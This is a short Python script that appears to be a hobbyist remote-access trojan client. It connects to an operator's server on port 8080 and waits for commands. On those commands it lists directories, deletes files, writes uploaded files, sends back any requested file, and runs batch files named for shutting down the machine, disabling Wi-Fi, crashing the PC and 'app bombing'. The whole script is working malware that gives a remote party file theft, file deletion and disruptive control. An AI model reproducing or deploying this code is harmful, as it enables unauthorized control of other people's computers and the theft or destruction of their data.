
import sys
import time
import os
import socket

s = socket.socket()
port=8080
host = input(str(" Please enter the server addres : "))
s.connect((host,port))
print("")
print("Connected to the server successfully")
print("")

# connection has been completed

#command receiving and execution

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command recieved")
    print("")
    if command == "view_cwd":
            files = os.getcwd()
            files = str(files)
            s.send(files.encode())
            print("Command has been executed successfully")
            
    elif command == "custom_dir":
            user_input = s.recv(5000)
            user_input = user_input.decode()
            files = os.listdir(user_input)
            files = str(files)
            s.send(files.encode())
            print("")
            print("Command has been executed successfully")
            print("")
            
    elif command == "remove_file":
            fileanddir = s.recv(6000)
            fileanddir = fileanddir.decode()
            os.remove(fileanddir)
            print("")
            print("Command has been executed successfully")
            print("")

    elif command == "send_files":
            filename = s.recv(6000)
            print(filename)
            new_file = open(filename, "wb")
            data = s.recv(6000)
            print(data)
            new_file.write(data)
            new_file.close()

    elif command == "download_files":
            file_path = s.recv(5000)
            file_path = file_path.decode()
            file = open(file_path, "rb")
            data = file.read()
            s.send(data)
            print("")
            print("File hass been sent succesfully")
            print("")
    
    elif command == "shutdown":
        print("")
        print("Shutdown command")
        s.send("command recieved".encode())
        os.system("shutdown.bat")
        
    elif command == "wifidisable":
        print("")
        print("wifidisable")
        s.send("command recieved".encode())
        os.system("Wifidisable.bat")

    elif command == "pccrash":
        print("")
        print("pccrash")
        s.send("command recieved".encode())
        os.system("pccrash.bat")
        
    elif command == "appbomber":
        print("")
        print("appbomber command")
        s.send("command recieved".encode())
        os.system("appbomber.bat")

    else:
            print("")
            print("Command not recognised")
       
        
